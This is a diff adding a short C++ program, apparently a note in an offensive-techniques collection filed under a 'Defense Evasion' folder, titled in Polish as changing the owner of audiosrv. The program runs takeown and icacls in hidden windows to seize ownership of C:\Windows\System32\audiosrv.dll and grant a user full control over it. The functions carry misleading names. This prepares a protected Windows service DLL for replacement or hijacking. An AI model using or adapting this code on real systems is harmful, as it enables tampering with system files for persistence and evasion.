@@ -1,0 +1,50 @@
+---
+title: "Zmiana własciciela audiosrv"
+folder: "07. Defense Evasion/Pliki Pomocnicze"
+---
+
+
+#include <iostream>
+#include <windows.h>
+#include <sddl.h>
+#include <Aclapi.h>
+void AutorunRegistryBackground4() {
+
+    const char* command = "takeown /f C:\\Windows\\System32\\audiosrv.dll";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+void AutorunRegistryBackground5() {
+
+    const char* command = "icacls C:\\Windows\\System32\\audiosrv.dll /grant User:(F)";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+int main() {
+    AutorunRegistryBackground4();
+    AutorunRegistryBackground5();
+
+    return 0;
+}
